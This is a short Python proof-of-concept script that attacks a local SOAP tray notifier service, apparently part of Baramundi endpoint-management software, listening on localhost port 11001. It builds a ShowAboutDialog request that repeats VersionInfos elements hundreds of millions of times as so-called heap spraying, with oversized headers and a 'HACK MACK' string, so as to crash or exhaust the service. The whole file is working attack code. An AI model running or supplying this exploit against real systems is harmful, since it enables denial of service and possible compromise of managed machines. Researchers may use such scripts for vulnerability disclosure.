#!/usr/bin/python

import requests
import json
import html

action_payload=1*"A"
TrayIconUrl="http://localhost:11001/traynotifierservice"
header={"User-Agent":action_payload,
	"Content-Type":"text/xml; charset=utf-8",
	"SOAPAction":action_payload
	}

heap_spraying=1024*1024*512*"\x41" 	
#heap_spraying=1024*1024*"\x41" 	
#heap_spraying=1024*"\x41" 		
#heap_spraying="\x41" 			

payload=1*"\x41"
html_msg="<html><body><h1>HACK MACK...<br> HACK MACK....</body></html>"

SOAPMsg='<?xml version="1.0" encoding="UTF-8"?> \
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body><traynotifierservice:ShowAboutDialog> \
<Caption></Caption> \
<TickerText></TickerText> \
<Hyperlink>http://www.baramundi.de</Hyperlink> \
' + heap_spraying*('\
<VersionInfos> \
<m-Module>' + payload + '</m-Module> \
<m-Version>' + payload + '</m-Version> \
<m-Path>' + payload +' </m-Path> \
</VersionInfos>') + ' \
</traynotifierservice:ShowAboutDialog> \
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>'

try:
	r=requests.post(TrayIconUrl, data=SOAPMsg.encode(), headers=header)
#	r=requests.get(TrayIconUrl, params=payload, headers=header, timeout=60.0)
except requests.exceptions.RequestException as err:
	print("[-] Error...")
	print(err.text)
	exit(1)
try:
	print(r)
	print(r.text)
except NameError as err:
	print("[-] Error...")
	print(err)
